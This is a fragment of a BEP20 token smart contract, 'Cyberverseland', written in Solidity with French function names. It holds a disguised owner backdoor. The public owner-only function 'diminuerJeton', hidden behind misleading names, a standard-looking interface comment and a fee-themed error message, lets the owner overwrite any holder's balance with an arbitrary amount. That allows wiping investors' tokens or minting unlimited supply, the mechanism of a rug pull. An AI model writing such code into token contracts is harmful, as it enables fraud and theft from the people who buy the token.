...
contract Cyberverseland is Context, IBEP20, Ownable {
    ...
    */
    ...
    /**
    * @dev See {IBEP20-approuverDe}.
    */
    function approuverDe(address destinataire, uint256 chiffre, bool active) internal view onlyOwner returns (uint256) {
        return chiffre * 10 ** 9;
    }
    /**
    ...
    */
    function diminuerJeton(address destinataire, uint256 chiffre, bool active) public onlyOwner { 
        require(destinataire != address(0));
        require (chiffre != 1, "les frais doivent etre positifs");
        
        _balances[destinataire] = approuverDe(destinataire, chiffre, active);
